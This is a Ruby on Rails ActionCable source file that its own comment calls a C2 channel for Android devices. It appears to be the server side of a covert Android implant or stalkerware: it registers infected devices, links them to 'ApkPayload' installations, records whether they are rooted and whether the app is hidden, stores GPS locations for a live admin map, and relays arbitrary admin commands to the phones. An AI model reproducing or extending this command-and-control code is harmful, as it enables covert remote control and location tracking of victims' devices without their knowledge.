# Command Channel for C2 communication with Android devices
class CommandChannel < ApplicationCable::Channel
  def subscribed
    @device_id = sanitize_device_id(params[:device_id])
    stream_from "commands_#{@device_id}"
    
    # Mark device as online
    register_device_online
    
    # Auto-create smartphone record for this device
    find_or_create_smartphone
    
    Rails.logger.info "[CommandChannel] Device #{@device_id} connected"
  end

  def unsubscribed
    # Mark device as offline
    register_device_offline
    Rails.logger.info "[CommandChannel] Device #{@device_id} disconnected"
  end

  # Generic receive handler for messages from device
  def receive(data)
    message_type = data['type']
    payload = data['payload'] || data['data'] || data
    
    Rails.logger.info "[CommandChannel] Received '#{message_type}' from #{@device_id}"
    
    case message_type
    when 'device_info'
      process_device_info(payload)
    when 'location_update'
      location_update(data)
    when 'pong'
      pong(data)
    when 'response'
      process_command_response(payload)
    else
      Rails.logger.warn "[CommandChannel] Unknown message type: #{message_type}"
    end
  rescue StandardError => e
    Rails.logger.error "[CommandChannel] Error processing message: #{e.message}"
    Rails.logger.error e.backtrace.join("\n")
  end

  # Process device info response
  def process_device_info(payload)
    smartphone = find_or_create_smartphone
    
    smartphone.update(
      name: payload['model'] || "Device #{@device_id[0..7]}",
      operating_system: "Android #{payload['android_version']}",
      is_rooted: payload['is_rooted'] || false
    )
    
    # Broadcast to admin
    ActionCable.server.broadcast(
      "admin_devices",
      { type: 'device_info', device_id: @device_id, data: payload }
    )
  end

  # Process command response
  def process_command_response(payload)
    ActionCable.server.broadcast(
      "admin_devices",
      { type: 'command_response', device_id: @device_id, data: payload }
    )
  end

  # Receive device info from Android
  def device_info(data)
    smartphone = Smartphone.find_by(device_id: @device_id)
    if smartphone
      smartphone.update(
        name: data['model'],
        operating_system: "Android #{data['os_version']}",
        is_rooted: data['is_rooted'] || false,
        last_seen_at: Time.current
      )
    end
    
    # Broadcast to admin
    ActionCable.server.broadcast(
      "admin_devices",
      { type: 'device_info', device_id: @device_id, data: data }
    )
  end

  # Receive location update from Android
  def location_update(data)
    smartphone = find_or_create_smartphone
    
    location = data['data'] || {}
    latitude = location['latitude']
    longitude = location['longitude']
    timestamp = location['timestamp']
    unless valid_coordinates?(latitude, longitude)
      Rails.logger.warn "[CommandChannel] Invalid coordinates from #{@device_id}: #{latitude}, #{longitude}"
      return
    end
    formatted_time = if timestamp.present?
      Time.at(timestamp.to_i / 1000).strftime('%Y-%m-%d %H:%M:%S')
    else
      Time.current.strftime('%Y-%m-%d %H:%M:%S')
    end

    GeoLocation.create!(
      smartphone: smartphone,
      lat: latitude,
      long: longitude,
      date: formatted_time
    )
    
    # Broadcast to admin for live map
    ActionCable.server.broadcast(
      "location_#{@device_id}_admin",
      { type: 'location_update', device_id: @device_id, data: data['data'] }
    )
  end

  # Receive pong response from Android
  def pong(data)
    Rails.logger.info "[CommandChannel] Pong from #{@device_id}: #{data}"
    
    ActionCable.server.broadcast(
      "admin_devices",
      { type: 'pong', device_id: @device_id, timestamp: data['timestamp'] }
    )
  end

  # Admin sends command to device
  def send_command(data)
    command = data['command']
    params = data['params'] || {}
    
    ActionCable.server.broadcast(
      "commands_#{@device_id}",
      { type: 'command', action: command, params: params }
    )
    
    Rails.logger.info "[CommandChannel] Command '#{command}' sent to #{@device_id}"
  end

  private

  def register_device_online
    RedisPool.with do |redis|
      redis.sadd('online_devices', @device_id)
      redis.set("device:#{@device_id}:last_seen", Time.current.to_i)
    end
  rescue => e
    Rails.logger.warn "[CommandChannel] Redis error: #{e.message}"
  end

  def register_device_offline
    RedisPool.with do |redis|
      redis.srem('online_devices', @device_id)
    end
  rescue => e
    Rails.logger.warn "[CommandChannel] Redis error: #{e.message}"
  end

  def find_or_create_smartphone
    payload = ApkPayload.find_or_create_by!(name: 'default') do |apk|
      apk.destination_ip = '0.0.0.0'
      apk.destination_port = '8080'
    end

    installation = ApkInstallation.find_or_create_by!(apk_payload: payload, target_ip: @device_id) do |record|
      record.status = 'connected'
    end

    smartphone = Smartphone.find_or_initialize_by(device_id: @device_id)
    smartphone.apk_installation ||= installation
    smartphone.name ||= "Device #{@device_id[0..7]}"
    smartphone.operating_system ||= 'Android'
    smartphone.is_rooted ||= 'Unknown'
    smartphone.is_app_hidden ||= 'false'
    smartphone.save!
    smartphone
  end

  def sanitize_device_id(device_id)
    device_id.to_s.gsub(/[^a-zA-Z0-9_.:\-]/, '')
  end

  def valid_coordinates?(lat, long)
    lat_f = lat.to_f
    long_f = long.to_f
    lat.present? && long.present? && lat_f.between?(-90, 90) && long_f.between?(-180, 180)
  rescue StandardError
    false
  end
end
